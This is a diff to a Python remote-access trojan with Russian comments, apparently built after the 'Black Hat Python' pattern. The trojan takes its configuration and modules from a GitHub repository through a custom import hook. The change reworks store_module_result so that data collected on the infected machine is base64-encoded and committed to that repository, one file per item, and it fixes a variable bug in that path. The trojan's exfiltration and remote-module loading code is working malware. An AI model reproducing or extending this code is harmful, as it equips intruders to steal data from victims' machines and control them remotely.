@@ -51,6 +51,7 @@ class Trojan:
         self.config_file = f'{id}.json'
         self.data_path = f'data/{id}/'
         self.repo = github_connect() # получаем объект репозитория где можем с ним делать все что угодно
+        self.count = 0
 
     def get_config(self):
         config_json = get_file_contents('config', self.config_file, self.repo) # ищем в репозитории bhptrojan(self.repo) папку с названием config и в ней ищем json файл self.config_file
@@ -68,15 +69,29 @@ class Trojan:
     def store_module_result(self, data, module):
         if data == False:
             sys.exit(0)
-        message = datetime.now().isoformat() + '_' + module
-        remote_path = f'data/{self.id}/{message}.data' # путь для создания файла для сохранения результата работы в момент запуска
+        
+        
         if isinstance(data, list):
             for item in data:
+                message = datetime.now().isoformat() + '_' + module + '_' + f'{self.count}'
+                remote_path = f'data/{self.id}/{message}.data' # путь для создания файла для сохранения результата работы в момент запуска
                 if not isinstance(item, bytes):
                     bindata = bytes('%r' % item, 'utf-8') # тут мы передаем результат работы модуля и способ кодирования в байты
                     self.repo.create_file(remote_path, message, base64.b64encode(bindata)) # кодируем байты в base64 указываем путь сохранения файла remote_path и коммит message и сохраняем файл в репозитории
+                    self.count += 1
                 else:
-                    self.repo.create_file(remote_path, message, base64.b64encode(bindata))
+                    self.repo.create_file(remote_path, message, base64.b64encode(item))
+                    self.count += 1
+        else:
+            message = datetime.now().isoformat() + '_' + module + '_' + f'{self.count}'
+            remote_path = f'data/{self.id}/{message}.data' # путь для создания файла для сохранения результата работы в момент запуска
+            if not isinstance(data, bytes):
+                bindata = bytes('%r' % data, 'utf-8') # тут мы передаем результат работы модуля и способ кодирования в байты
+                self.repo.create_file(remote_path, message, base64.b64encode(bindata)) # кодируем байты в base64 указываем путь сохранения файла remote_path и коммит message и сохраняем файл в репозитории
+            else:
+                self.repo.create_file(remote_path, message, base64.b64encode(data))
+        self.count += 1
+                
         
        
 
@@ -97,3 +112,4 @@ if __name__ == '__main__':
     sys.meta_path.append(GitImporter()) # позволяет загружать собственные модули в троян. говорим интерпретатору сначала пройдись по моим загрузчикам модулей а только затем по дефолтным
     trojan = Trojan('abc') # инициализируем троян и получаем доступ к репозиторию с модулями и конфигами
     trojan.run() # запускаем процесс трояна
+
